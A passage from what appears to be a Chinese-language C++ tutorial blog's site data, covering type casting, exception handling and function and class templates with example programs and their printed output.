&lt;iostream&gt;using namespace std;class Tree {};class Animal {public: virtual void cry() = 0;};class Dog : public Animal {public: void cry() override { cout &lt;&lt; "dog cry ..." &lt;&lt; endl; } void watchHome() { cout &lt;&lt; "dog watch home" &lt;&lt; endl; }};class Cat : public Animal {public: void cry() override { cout &lt;&lt; "cat cry ..." &lt;&lt; endl; } void playBall() { cout &lt;&lt; "cat play ball ..." &lt;&lt; endl; }};void playAnimal(Animal *animal) { animal-&gt;cry(); // 动态类型转换，将父类转换为子类，运行时会做类型检查 Dog *dog = dynamic_cast&lt;Dog *&gt;(animal); if (dog != NULL) { dog-&gt;watchHome(); } Cat *cat = dynamic_cast&lt;Cat *&gt;(animal); if (cat != NULL) { cat-&gt;playBall(); }}void printBuf(const char *buf) { // const_cast 去除变量的 const 只读属性 char *m_buf = const_cast&lt;char *&gt;(buf); m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}void printBuf2() { // 定义指针指向一个常量，这里的常量的内存空间不可以更改 char* buf = "aaaaa"; // const_cast 去除变量的 const 只读属性 char* m_buf = const_cast&lt;char*&gt;(buf); // 此时若更改指针所指向的内存空间，会带来灾难性的后果 m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}int main() { char *p1 = "hello"; double pi = 3.1415926; // 静态类型转换，编译的时候 C++ 编译器会做类型检查 int num1 = static_cast&lt;int&gt;(pi); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // 静态类型转换，基本类型都能转换，但是不能转换指针类型（多态除外） // int* p2 = static_cast&lt;int*&gt;(p1); // 错误写法，C++ 编译器编译失败 // 重新解释类型，不同类型之间会进行强制类型转换，包括转换指针类型 int *p2 = reinterpret_cast&lt;int *&gt;(p1); cout &lt;&lt; "p2 = " &lt;&lt; p2 &lt;&lt; endl; // 去除变量的 const 只读属性 char buf[] = "aaaaa"; printBuf(buf); // printBuf2(); // 动态类型转换，基类和派生类之间转换，运行时会做类型检查 Dog dog; Cat cat; playAnimal(&amp;dog); playAnimal(&amp;cat); // 多态的其他使用场景 Animal *pAnimal = NULL; pAnimal = &amp;dog; pAnimal = static_cast&lt;Animal *&gt;(&amp;dog); // 编译通过 pAnimal-&gt;cry(); pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;dog); // 编译通过 pAnimal-&gt;cry(); Tree tree; // pAnimal = static_cast&lt;Animal*&gt;(&amp;tree); // 错误写法，C++ 编译器编译失败 pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;tree); // 编译通过 return 0;} 程序运行输出的结果如下： 12345678910num1 = 3p2 = 005661B8baaaabaaaadog cry ...dog watch homecat cry ...cat play ball ...dog cry ...dog cry ... 使用总结： 一般情况下，不建议进行类型转换，应该避免进行类型转换 要清楚地知道：要转换的变量，类型转换前是什么类型，类型转换后是什么类型，转换后有什么后果 异常处理机制 异常的介绍： 异常是一种程序控制机制，与函数机制独立和互补 函数是一种以栈结构展开的上下函数衔接的程序控制系统，而异常是另一种控制结构，它依附于栈结构，却可以同时设置多个异常类型作为捕获条件，从而实现以类型匹配在栈机制中跳跃回馈 异常设计目的： 栈机制是一种高度节律性的控制机制，面向对象编程却要求对象之间有方向、有目的的控制传动，从一开始，异常就是冲着改变程序控制结构，以适应面向对象程序更有效地工作这个主题，而不是仅为了进行错误处理 异常设计出来之后，却发现在错误处理方面获得了最大的好处 异常处理的基本思想传统错误处理机制传统的程序错误处理机制，是通过函数返回值来处理错误。 异常处理的基本思想 异常跨越了函数，并超脱于函数机制，决定了其对函数的跨越式回跳 C++ 的异常处理机制使得异常的引发和异常的处理不必在同一个函数中，这样底层的函数可以着重解决具体问题，而不必过多的考虑异常的处理，上层调用者可以在适当的位置设计对不同类型异常的处理 异常是专门针对抽象编程中的一系列错误进行处理的，C++ 中不能借助函数机制，因为栈结构的本质是先进后出，依次访问，无法进行跳跃，但错误处理的特征却是遇到错误信息就想要转到若干级之上进行重新尝试，如图所示： C++ 异常的基础使用异常的基本语法 a) 若有异常则通过 throw 操作创建一个异常对象并抛掷 b) 将可能抛出异常的程序段嵌在 try 块之中，控制通过正常的顺序执行到达 try 语句，然后执行 try 代码块内的保护段 c) 如果在保护段执行期间没有引起异常，那么跟在 try 代码块后的 catch 子句就不会执行，程序从 try 代码块后跟随的最后一个 catch 子句后面的语句将继续执行下去 d) catch 子句按其在 try 代码块后出现的顺序被检查，匹配到的 catch 子句将捕获并处理异常（或继续抛掷异常） e) 如果匹配的异常处理器未被找到，则函数 terminate() 将被自动调用，其缺省功能是调用函数 abort() 终止程序的运行 f) 处理不了的异常，可以在 catch 子句的最后一个分支，使用 throw 语法，向上抛掷异常 异常的简单使用案例一123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int divide(int x, int y) { if (0 == y) { throw y; // 抛出 int 类型的异常 } return x / y;}int main() { try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", 被除数不能为零" &lt;&lt; endl; } // 会捕获所有未被捕获的异常，必须最后出现 catch (...) { throw "发生未知的异常 ..."; } cout &lt;&lt; "程序正常结束运行" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 120, 被除数不能为零程序正常结束运行 异常的简单使用案例二异常机制与函数机制互不干涉，但捕捉的方式是基于类型匹配。异常捕捉相当于函数返回类型的匹配，而不是函数参数的匹配，所以异常捕捉不用考虑一个抛掷中的多种数据类型匹配问题。异常捕捉是严格按照类型匹配的，它的类型匹配之苛刻程度可以和模板的类型匹配相媲美。它不允许相容类型的隐式转换，比如，抛掷 char 类型的异常，用 int 类型就捕捉不到对应的异常。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class A {};class B {};int main() { try { int a; int i = 0; double d = 2.3; char str[20] = "Hello"; cout &lt;&lt; "Please input a exception number: "; cin &gt;&gt; a; switch (a) { case 1: throw i; case 2: throw d; case 3: throw str; case 4: throw A(); case 5: throw B(); default: cout &lt;&lt; "No exception throws here.\\n"; } } catch (int) { cout &lt;&lt; "int exception.\\n"; } catch (double) { cout &lt;&lt; "double exception.\\n"; } catch (char*) { cout &lt;&lt; "char* exception.\\n"; } catch (A) { cout &lt;&lt; "class A exception.\\n"; } catch (B) { cout &lt;&lt; "class B exception.\\n"; } cout &lt;&lt; "That\'s ok.\\n"; return 0;} 程序运行输出的结果如下： 123Please input a exception number: 3char* exception.That\'s ok. 异常在继承中的使用案例 MyException.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#pragma once#include &lt;iostream&gt;using namespace std;// 异常抽象类class SizeException {public: // 纯虚函数 virtual void printErr() = 0;public: int getSize() { return this-&gt;size; }protected: int size = 0;};class NegativeException : public SizeException {public: NegativeException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小不能小于零, 当前大小为 " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class TooBigException : public SizeException {public: TooBigException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小太大, 当前大小为 " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class ZeroException : public SizeException {public: ZeroException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小不允许为零" &lt;&lt; endl; }}; MyArray.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#pragma once#include &lt;iostream&gt;#include "MyException.h"using namespace std;class MyArray {public: // 构造函数 MyArray(int size) { // 数组初始化大小检查，大小不合法则抛出异常 if (size &lt; 0) { throw NegativeException(size); } else if (size == 0) { throw ZeroException(size); } else if (size &gt; this-&gt;m_max_size) { throw TooBigException(size); } this-&gt;m_size = size; this-&gt;m_space = new int[size]; } // 拷贝构造函数 MyArray(const MyArray&amp; obj) { // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } } // 析构函数 ~MyArray() { if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } }public: // 使用类成员函数，重载运算符 "[]" int&amp; operator[](int index) { return this-&gt;m_space[index]; } // 使用类成员函数，重载运算符 "=" MyArray&amp; operator=(const MyArray&amp; obj) { // 释放原本的内存空间 if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this; } // 使用友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj);public: int getsize() { return m_size; }private: int* m_space; int m_size; int m_max_size = 1000;};// 使用友元函数，重载运算符 "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { out &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} main.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142#include "MyArray.h"int main() { try { // 调用构造函数 MyArray array1(-6); // MyArray array1(5); // MyArray array1(0); // MyArray array1(2000); // 重载运算符 "[]" for (int i = 0; i &lt; array1.getsize(); i++) { array1[i] = 20 + i; } // 重载运算符 "&lt;&lt;" cout &lt;&lt; array1 &lt;&lt; endl; // 调用拷贝构造函数 MyArray array2 = array1; cout &lt;&lt; array2 &lt;&lt; endl; MyArray array3(3); array3[0] = 43; array3[1] = 56; array3[2] = 79; cout &lt;&lt; array3 &lt;&lt; endl; // 重载运算符 "=" array3 = array2; cout &lt;&lt; array3 &lt;&lt; endl; } // 使用引用捕获异常（多态） catch (SizeException&amp; e) { e.printErr(); } catch (...) { cout &lt;&lt; "发生未知异常" &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1数组大小不能小于零, 当前大小为 -6 C++ 异常的进阶使用栈解旋异常被抛出后，从进入 try 代码块起，到异常被抛掷前，这期间在栈上构造的所有对象，都会被自动析构，析构的顺序与构造的顺序相反。这一过程称为 栈解旋（unwinding）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {public: Test(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; }private: int a; int b;};int divide(int x, int y) { Test t1(3, 4), t2(5, 6); if (0 == y) { throw y; // 抛出 int 类型的异常 } return x / y;}int main() { // divide(5, 0); 如果 divide() 函数的调用写在 try 代码块之外，那么 Test 类的析构函数不会自动被调用 try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", 被除数不能为零" &lt;&lt; endl; } catch (...) { cout &lt;&lt; "发生未知的异常"; } return 0;} 程序运行输出的结果如下： 12345构造函数被调用构造函数被调用析构函数被调用析构函数被调用0, 被除数不能为零 异常接口的声明 a) 为了加强程序的可读性，可以在函数声明中列出可能抛出的所有异常类型，例如：void func() throw (A, B, C , D) {}，这个函数 func（） 能够且只能抛出类型 A、B、C、D 及其子类型的异常 b) 如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexpected() 函数会被调用，该函数的默认行为是调用 terminate() 函数中止程序 c) 如果在函数声明中没有包含异常接口声明，则此函数可以抛掷任何类型的异常，例如：void func() {} d) 一个不抛掷任何类型异常的函数，可以声明为：void func() throw() {} 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class A {};class B {};class C {};class D {};class F {};// 能够且只能抛出类型 A、B、C、D 及其子类型的异常void funcA() throw (A, B, C, D) { throw A();}// 不能抛出任何类型的异常void funcB() throw() {}// 可以抛出任何类型的异常void funcC() { throw B();}int main() { try { funcA(); } catch (...) { cout &lt;&lt; "发生异常 ..." &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1发生异常 ... 默认的异常处理器terminate () 函数在 C++ 中，异常是不可以忽略的，当异常找不到匹配的 catch 子句时，会调用系统的库函数 terminate()（在头文件中）；默认情况下，terminate（） 函数会调用标准 C 库函数 abort（） 使程序终止而退出。当调用 abort() 函数时，程序不会调用正常的终止函数，也就是说，全局对象和静态对象的析构函数不会执行，这就可能会导致内存泄漏。值得一提的是，在多线程程序中，各个 terminate() 函数是互相独立的，每个线程都有自己的 terminate() 函数。 set_terminate () 函数在 C++ 中，通过使用标准的 set_terminate() 函数，可以设置自己的 terminate（) 函数。自定义的 terminate() 函数不能有参数，而且返回值类型必须为 void。另外，terminate() 函数不能抛出异常，它必须终止程序。如果 terminate() 函数被调用，这就意味着问题已经无法解决了。 设置默认的异常处理器1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;// 自定义 terminate() 函数void myTerminate() { cout &lt;&lt; "函数 myTerminate() 被 terminate() 调用!" &lt;&lt; endl; exit(-1);}int divide(int x, int y) { return x / y;}int main() { // 设置默认的异常处理器 set_terminate(myTerminate); int x = 10, y = 0, result; try { if (y == 0) { throw "被除数为零!"; //抛出异常，由 terminate() 函数捕获 } else { result = x / y; } } // 不会被整型异常捕获 catch (int e) { cout &lt;&lt; "捕获到整型异常!" &lt;&lt; endl; } cout &lt;&lt; "程序正常结束运行!" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1函数 myTerminate() 被 terminate() 调用! C++ 提供的标准异常库标准异常库的介绍 标准异常库的使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(int age) { if (age &gt; 100) { // 抛出标准库内的异常 throw out_of_range("年龄太大"); } this-&gt;age = age; }private: int age;};// 继承标准库内的异常class MyException : public exception {public: MyException(const char *p) { this-&gt;m_p = p; } virtual const char *what() { cout &lt;&lt; "MyException 类型的异常 : " &lt;&lt; m_p &lt;&lt; endl; return m_p; }private: const char *m_p;};int main() { try { // Teacher teacher(105); throw MyException("发生自定义异常!"); } catch (out_of_range e) { cout &lt;&lt; "out_of_range 类型的异常 : " &lt;&lt; e.what() &lt;&lt; endl; } catch (MyException &amp;e) { e.what(); } catch (...) { cout &lt;&lt; "发生未知类型的异常!" &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1MyException 类型的异常 : 发生自定义异常! 异常类型和异常变量的生命周期 throw 异常是有类型的，可以使用数字、字符串、类对象，catch 严格按照类型进行匹配 throw 类对象类型的异常时： 如果捕获异常的时候，使用一个异常变量，则拷贝构造该异常变量 如果捕获异常的时候，使用了引用，则会使用 throw 时候的那个对象 捕获异常的时候，指针可以和引用 / 元素同时出现，但是引用与元素不能同时出现 结论：如果抛出的是类对象类型的异常，则使用引用进行异常捕获比较合适 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;using namespace std;class BadSrcType {};class BadDestType {};class BadProcessType {public: BadProcessType() { cout &lt;&lt; "BadProcessType的构造函数被调用" &lt;&lt; endl; } BadProcessType(const BadProcessType&amp; obj) { cout &lt;&lt; "BadProcessType的拷贝构造函数被调用" &lt;&lt; endl; } ~BadProcessType() { cout &lt;&lt; "BadProcessType的析构函数被调用" &lt;&lt; endl; }};void myStrcpy(char* to, char* from) { if (to == NULL) { throw BadDestType(); } if (from == NULL) { throw BadSrcType(); } if (*from == \'a\') { throw BadProcessType(); } if (*from == \'b\') { // 不建议使用这种写法 throw&amp; (BadProcessType()); } if (*from == \'c\') { throw new BadProcessType; } while (*from != \'\\0\') { *to = *from; to++; from++; } *to = \'\\0\';}int main() { int ret = 0; char buf1[] = "cbbcdefg"; char buf2[1024] = { 0 }; try { myStrcpy(buf2, buf1); } catch (BadSrcType e) { cout &lt;&lt; " BadSrcType 类型异常" &lt;&lt; endl; } catch (BadDestType e) { cout &lt;&lt; " BadDestType 类型异常" &lt;&lt; endl; } /* // 结论1: 如果接收异常的时候，使用一个异常变量，则拷贝构造该异常变量 catch (BadProcessType e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; } // 结论2: 如果接收异常的时候，使用了引用，则会使用throw时候的那个对象 catch (BadProcessType&amp; e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; } // 结论3: 接收异常的时候，指针可以和引用/元素同时出现，但是引用与元素不能同时出现 catch (BadProcessType* e) { cout &lt;&lt; " BadProcessType 类型异常" &lt;&lt; endl; delete e; } // 结论4: 如果抛出的是类对象类型的异常，则使用引用进行异常捕获比较合适 */ catch (...) { cout &lt;&lt; "未知 类型异常" &lt;&lt; endl; } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之二",url:"/posts/779107de.html",text:'函数模板和类模板C++ 提供了函数模板（function template）。所谓函数模板，实际上是建立一个通用函数，其函数类型和形参类型不具体指定，用一个虚拟的类型来代表，这个通用函数就称为函数模板。凡是函数体相同的函数都可以用这个模板来代替，不必定义多个函数，只需在模板中定义一次即可。在调用函数时，系统会根据实参的类型来取代模板中的虚拟类型，从而实现不同函数的功能。 C++ 提供两种模板机制：函数模板、类模板 模板又称之为 泛型编程 模板把函数或类要处理的数据类型参数化，表现为参数的多态性，称为类属 模板用于表达逻辑结构相同，但具有数据元素类型不同的数据对象的通用行为 类属 —— 类型参数化，又称参数模板，使得程序（算法）可以从逻辑功能上抽象，把被处理的对象（数据）类型作为参数传递 函数模板函数模板的定义 模板声明的语法为：template &lt; 类型形式参数表 &gt;，例如 template &lt;typename T&gt; 类型形式参数表的语法为：typename T1 , typename T2 , …… , typename Tn 或者 class T1 , class T2 , …… , class Tn 函数模板的调用 myswap(a, b);：自动数据类型推导 myswap&lt;float&gt;(a, b);：显示类型调用（推荐） 函数模板的简单使用 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 函数定义void myswap(T &amp;a, T &amp;b) { T temp; temp = a; a = b; b = temp;}int main() { // 自动数据类型推导 int x = 1, y = 2; myswap(x, y); printf("x = %d, y = %d\\n", x, y); // 自动数据类型推导 double n = 0.5, m = 0.8; myswap(n, m); printf("n = %f, m = %f\\n", n, m); // 显示类型调用（推荐） char i = \'h\', j = \'e\'; myswap&lt;char&gt;(i, j); printf("n = %c, m = %c\\n", i, j); return 0;} 程序运行输出的结果如下： 123x = 2, y = 1n = 0.800000, m = 0.500000n = e, m = h 函数模板做函数参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;iostream&gt;using namespace std;// 使用函数模板，实现数组排序template &lt;typename T1&gt;void arraySort(T1* array, int size, bool asc = true) { if (array == NULL || size == 0) { return; } T1 tmp; for (int i = 0; i &lt; size; i++) { for (int j = i + 1; j &lt; size; j++) { // 升序排序（从小到大） if (asc) { if (array[i] &gt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } // 降序排序（从大到小） else { if (array[i] &lt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } } }}// 使用函数模板，打印数组template &lt;typename T2&gt;void printArray(T2* array, int size) { for (int i = 0; i &lt; size; i++) { cout &lt;&lt; array[i] &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { int array[] = { 32, 16, 29, 9, 43, 53, 23 }; int size = sizeof(array) / sizeof(*array); cout &lt;&lt; "排序之前: "; printArray&lt;int&gt;(array, size); arraySort&lt;int&gt;(array, size, false); cout &lt;&lt; "排序之后: "; printArray&lt;int&gt;(array, size); cout &lt;&lt; "------------------------------" &lt;&lt; endl; char array2[] = { \'c\', \'z\', \'h\', \'i\', \'q\', \'m\' }; int size2 = sizeof(array2) / sizeof(*array2); cout &lt;&lt; "排序之前: "; printArray&lt;char&gt;(array2, size2); arraySort&lt;char&gt;(array2, size2); cout &lt;&lt; "排序之后: "; printArray&lt;char&gt;(array2, size2); return 0;} 程序运行输出的结果如下： 12345排序之前: 32 16 29 9 43 53 23排序之后: 53 43 32 29 23 16 9------------------------------排序之前: c z h i q m排序之后: c h i m q z 函数模板与普通函数函数模板和普通函数的区别： a) 函数模板不允许自动类型转化 b) 普通函数能够进行自动类型转换 函数模板和普通函数的调用规则： a) C++ 编译器优先考虑使用普通函数 b) 如果函数模板可以产生一个更好的匹配，那么编译器会选择函数模板 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;void myswap(T&amp; a, T&amp; b) { T tmp; tmp = a; a = b; b = tmp; cout &lt;&lt; "模板函数被调用" &lt;&lt; endl;}void myswap(int a, char b) { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; "普通函数被调用" &lt;&lt; endl;}int main() { int a = 10; char c = \'z\'; myswap(a, c); // 调用普通函数 myswap(c, a); // 调用普通函数，会进行隐式的类型转换 myswap(a, a); // 调用函数模板（本质是类型参数化），将严格地按照类型进行匹配，不会进行隐式的类型转换 return 0;} 程序运行输出的结果如下： 123456a = 10, b = z普通函数被调用a = 122, b =普通函数被调用模板函数被调用 函数模板与函数重载 a) 函数模板可以像普通函数一样被重载 b) 通过空模板实参列表的语法，可以限制编译器只使用函数模板匹配 c) 如果函数模板可以产生一个更好的匹配，那么编译器会选择函数模板 123456789101112131415161718192021222324252627282930313233343536#include "iostream"using namespace std;int Max(int a, int b){ cout &lt;&lt; "int Max(int a, int b)" &lt;&lt; endl; return a &gt; b ? a : b;}template &lt;typename T&gt;T Max(T a, T b){ cout &lt;&lt; "T Max(T a, T b)" &lt;&lt; endl; return a &gt; b ? a : b;}// 函数模板重载template &lt;typename T&gt;T Max(T a, T b, T c){ cout &lt;&lt; "T Max(T a, T b, T c)" &lt;&lt; endl; return Max(Max(a, b), c);}void main(){ int a = 1; int b = 2; cout &lt;&lt; Max(a, b) &lt;&lt; endl; // 当函数模板和普通函数都符合调用时,优先选择普通函数 cout &lt;&lt; Max&lt;&gt;(a, b) &lt;&lt; endl; // 通过空模板实参列表的语法，可以限制编译器只使用函数模板匹配 cout &lt;&lt; Max(3.0, 4.0) &lt;&lt; endl; // 如果函数模板产生更好的匹配 使用函数模板 cout &lt;&lt; Max(5.0, 6.0, 7.0) &lt;&lt; endl; // 函数模板的重载 cout &lt;&lt; Max(\'a\', 100) &lt;&lt; endl; // 调用普通函数，可以进行隐式类型转换 return;} 程序运行输出的结果如下： 123456789101112int Max(int a, int b)2T Max(T a, T b)2T Max(T a, T b)4T Max(T a, T b, T c)T Max(T a, T b)T Max(T a, T b)7int Max(int a, int b)100 函数模板底层原理剖析 编译器并不是根据函数模板，产生能够处理任意参数的函数 编译器本质上是根据具体的调用类型，从函数模板产生不同的函数 编译器会对函数模板进行两次编译，在声明的地方对函数模板代码本身进行第一次编译，在调用的地方对参数替换后的函数模板代码进行第二次编译 类模板类模板与函数模板的定义和使用类似，在实际项目开发中，经常有两个或多个类，其功能是相同的，仅仅是数据类型不同，为了不重复定义功能相同的类，可以使用类模板来解决这类问题。 类模板的定义 类模板用于实现类所需数据的类型参数化 类模板在表示如数组、表、图等数据结构显得特别重要，这些数据结构的表示和算法不受所包含的元素类型的影响 在下述的所有代码中，template &lt;typename T&gt; 等价于 template &lt;class T&gt; 类模板的简单使用值得一提的是，在类模板中如果使用了构造函数，则必须遵守 C++ 类的构造函数的调用规则 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T t) { this-&gt;t = t; } T&amp; getT() { return this-&gt;t; }private: T t;};// 类模板做函数参数void printA(A&lt;int&gt;&amp; a) { cout &lt;&lt; a.getT() &lt;&lt; endl;}int main() { A&lt;int&gt; a(100); // 模板类是抽象的，需要声明具体的类型（模板参数列表），这里的 &lt;int&gt; 不能省略 cout &lt;&lt; a.getT() &lt;&lt; endl; A&lt;int&gt; a2(50); printA(a2); return 0;} 程序运行输出的结果如下： 1210050 类模板与派生类的使用普通类继承类模板在 C++ 中，类模板可以被普通类继承，普通类继承类模板时，需要声明父类具体的数据类型。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// 普通类继承类模板，需要声明具体的类型（模板参数列表），这里的 &lt;int&gt; 不能省略class B : public A&lt;int&gt; {public: B(int a, int b) : A&lt;int&gt;(a) { this-&gt;b = b; } void printB() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int b;};int main() { A&lt;int&gt; a(100); cout &lt;&lt; a.getA() &lt;&lt; endl; B b(1, 3); b.printB(); return 0;} 程序运行输出的结果如下： 12100a = 1, b = 3 类模板继承类模板12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;// 模板声明template &lt;typename T&gt;// 类定义class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// 模板声明template &lt;typename T&gt;// 类模板继承类模板class B : public A&lt;T&gt; {public: B(T a, T b) : A(a) { this-&gt;b = b; } T&amp; getB() { return this-&gt;b; }private: T b;};int main() { A&lt;int&gt; a(3); cout &lt;&lt; a.getA() &lt;&lt; endl; B&lt;double&gt; b(3.2, 4.5); cout &lt;&lt; b.getA() &lt;&lt; endl; cout &lt;&lt; b.getB() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12333.24.5 类模板函数的三种写法值得一提的是，企业项目开发中，建议使用第一种或者第三种方式，STL 库一般都采用第一种方式。 所有的类模板函数写在类的内部（第一种）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: // 构造函数 Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b; } // 类成员函数 void print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; } // 类成员函数，重载运算符 "+" Complex operator+(Complex&amp; c2) { Complex tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp; } // 友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out; } // 友元函数 friend Complex sub(Complex&amp; c1, Complex&amp; c2) { Complex tmp(c1.a - c2.a, c1.b - c2.b); return tmp; }private: T a; T b;};int main() { Complex&lt;int&gt; c1(1, 4); Complex&lt;int&gt; c2(3, 6); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234a = 1, b = 4a = 3, b = 6a = 4, b = 10a = -2, b = -2 所有的类模板函数写在类的外部（第二种）所有的类模板函数写在类的外部（写在同一个 .cpp 文件），当使用友元函数重载了 &lt;&lt;、&gt;&gt; 运算符时，需要特别注意声明友元函数的写法 friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);。特别注意，除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，其他运算符的重载尽量都使用类成员函数。千万不要滥用友元函数，尤其类模板与友元函数一起使用的时候，这是因为需要使用怪异的语法来解决 C++ 编译器出现的错误，且不同的 C++ 编译器表现行为不一定一致。假设在类模板中滥用了友元函数，解决 C++ 编译问题的语法详见 图解分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;/********** START 解决类模板与友元函数滥用（非重载左移与右移运算符）时出现的编译问题 *********/template &lt;typename T&gt; class Complex;template &lt;typename T&gt; Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2);/********** END 解决类模板与友元函数滥用（非重载左移与右移运算符）时出现的编译问题 *********/template &lt;typename T&gt;class Complex {public: // 构造函数 Complex(T a, T b); // 类成员函数 void print(); // 类成员函数，重载运算符 "+" Complex operator+(Complex&amp; c2); // 友元函数（滥用友元函数） friend Complex sub&lt;T&gt;(Complex&amp; c1, Complex&amp; c2); // 友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;};// 构造函数template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// 类成员函数template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; 